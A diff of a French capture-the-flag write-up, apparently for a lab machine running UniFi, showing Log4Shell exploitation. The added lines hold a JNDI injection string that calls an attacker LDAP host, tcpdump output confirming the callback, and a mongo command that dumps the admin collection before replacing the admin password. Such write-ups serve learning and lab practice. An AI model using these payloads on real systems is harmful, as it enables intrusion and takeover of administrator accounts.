@@ -6,9 +6,18 @@ Cette machine est intéressante vu que Log4j a supris tout le monde, étant donn
 
 ## On teste la vulnerabilité
 
-On se sert du champ remember pour y introduire un appel ldap
+On se sert du champ remember avec le repeater de burpsuite pour y introduire un appel ldap, on est à l'écoute avec tcpdump
 
 ${jndi:ldap://10.10.14.19/whatever}
+
+```bash
+❯ tcpdump -i tun0 port 389 -v
+tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+03:18:20.530190 IP (tos 0x0, ttl 63, id 10956, offset 0, flags [DF], proto TCP (6), length 60)
+    10.129.125.109.60474 > 10.10.14.19.ldap: Flags [S], cksum 0xf4e8 (correct), seq 339107591, win 64240, options [mss 1360,sackOK,TS val 2396506282 ecr 0,nop,wscale 7], length 0
+03:18:20.530225 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 40)
+    10.10.14.19.ldap > 10.129.125.109.60474: Flags [R.], cksum 0xaec7 (correct), seq 0, ack 339107592, win 0, length 0
+```
 
 ## On construit l'application java rogue-jndi avec maven
 
@@ -75,7 +84,11 @@ unifi@unified:/usr/lib/unifi$
 
 ## On se connecte a mongo pour chercher le pass de l'admin
 
-Une fois trouve on va le remplacer par le notre
+```bash
+unifi@unified:/home/michael$ mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
+```
+
+Une fois trouvé on va le remplacer par le notre
 
 1. On cree le pass en sha-512
 
